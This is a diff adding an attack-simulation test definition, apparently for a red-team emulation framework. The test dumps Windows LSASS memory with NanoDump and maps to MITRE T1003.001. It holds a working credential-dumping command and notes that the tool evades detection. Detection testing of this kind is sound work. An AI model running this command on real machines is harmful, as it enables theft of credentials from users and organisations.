@@ -1,0 +1,28 @@
+api_version: "2.0"
+name: Dump LSASS.exe Memory using NanoDump
+description: |
+    The NanoDump tool uses syscalls and an invalid dump signature to avoid detection.
+
+    https://github.com/helpsystems/nanodump
+
+    Upon successful execution, you should find the nanondump.dmp file in the temp directory
+uuid: dddd4aca-bbed-46f0-984d-e4c5971c51ea
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1003: OS Credential Dumping'
+    subtechniques:
+        - 'T1003.001: LSASS Memory'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: dump-lsass.exe-memory-using-nanodump
+      inline: |
+        PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe -w "%temp%\nanodump.dmp"
+      executor: command_prompt
+      cleanup:
+        inline: |
+            del "%temp%\nanodump.dmp" >nul 2> nul
+        executor: command_prompt
